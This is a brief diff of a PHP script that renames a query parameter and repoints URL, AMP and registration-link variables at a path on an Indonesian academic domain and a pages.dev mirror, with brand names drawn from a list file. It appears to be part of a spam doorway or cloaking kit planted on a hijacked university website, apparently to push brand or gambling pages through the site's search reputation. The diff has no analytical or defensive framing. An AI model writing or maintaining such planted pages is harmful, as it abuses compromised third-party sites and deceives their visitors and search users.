@@ -20,7 +20,7 @@ function feedback404()
    
 }
 
-$tunnel = "layanan";
+$tunnel = "ac_id";
 $filename = "list.txt";
 
 if (isset($_GET[$tunnel])) {
@@ -59,9 +59,9 @@ if (isset($_GET[$tunnel])) {
 }
 $brand = strtolower($BRAND);
 $baseAuthor = $BRAND;
-$URL  = "https://stba-jia.ac.id/info/?layanan=$BRAND";
-$PAGEURL = "https://stba-jia.ac.id/info/?layanan=$BRAND";
-$AMP = "https://stbajiaweb.pages.dev/?layanan=$BRAND";
+$URL  = "https://stba-jia.ac.id/dom/?ac_id=$BRAND";
+$PAGEURL = "https://stba-jia.ac.id/dom/?ac_id=$BRAND";
+$AMP = "https://stbajiaweb.pages.dev/?ac_id=$BRAND";
 $DAFTAR = "https://stbajiaweb.pages.dev/";
 $BANNER = "https://i.pinimg.com/1200x/25/5e/70/255e70ae3ee3b5d43f8dedd3a7a12479.jpg";
 $LOGO = "https://i.pinimg.com/236x/ed/62/de/ed62de3c39e8b94a4ea2e0273405917e.jpg";
